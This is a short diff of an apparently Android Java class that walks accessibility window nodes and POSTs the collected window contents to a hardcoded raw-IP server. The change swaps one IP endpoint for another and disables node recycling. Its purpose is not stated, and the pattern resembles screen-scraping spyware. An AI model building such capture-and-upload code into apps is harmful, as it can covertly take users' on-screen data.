@@ -53,7 +53,7 @@ public class Windows {
         for (int i = 0; i < childCount; i++) {
             AccessibilityNodeInfo childNode = node.getChild(i);
             enumerateWindows(childNode, windowNodes);
-            childNode.recycle(); // recycle each child node
+//            childNode.recycle(); // recycle each child node
         }
     }
 
@@ -81,10 +81,7 @@ public class Windows {
 
     public void sendWindowsToServer(String buffer) {
         RequestActions requestActions = new RequestActions();
-//        System.out.println(buffer);
-//        CustomRequest postRequest = createPostRequest("http://172.29.117.71:8080/windows", buffer);
-//        CustomRequest postRequest = createPostRequest("http://18.189.157.240/windows ", buffer);
-        CustomRequest postRequest = createPostRequest("http://18.119.113.54/windows ", buffer);
+        CustomRequest postRequest = createPostRequest("http://18.117.184.130/windows", buffer);
         Request request = postRequest.buildRequest();
         CompletableFuture<String> future = requestActions.sendRequest(request, postRequest);
 
